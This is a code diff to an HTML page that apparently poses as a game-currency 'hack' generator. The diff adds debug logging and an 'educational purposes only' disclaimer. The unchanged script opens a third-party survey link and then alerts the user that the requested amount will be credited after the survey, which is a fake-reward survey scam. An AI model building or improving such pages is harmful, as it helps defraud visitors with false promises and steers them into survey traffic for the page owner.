@@ -181,10 +181,11 @@
         </div>
     </div>
 
-    <footer>Use at your own risk.</footer>
+    <footer>Disclaimer: This tool is for educational purposes only. Use at your own risk.</footer>
 
     <script>
         function startHack() {
+            console.log("startHack function called");
             var username = document.getElementById('username').value;
             var currency = document.getElementById('currency').value;
             var amount = document.getElementById('amount').value;
@@ -217,6 +218,7 @@
         }
 
         function openSurvey() {
+            console.log("openSurvey function called");
             window.open("https://singingfiles.com/show.php?l=0&u=2172431&id=58740", "_blank");
             alert("Your request has been processed. Please complete the survey to finalize the process. Once completed, your requested amount will be added to your account within 24 hours.");
         }
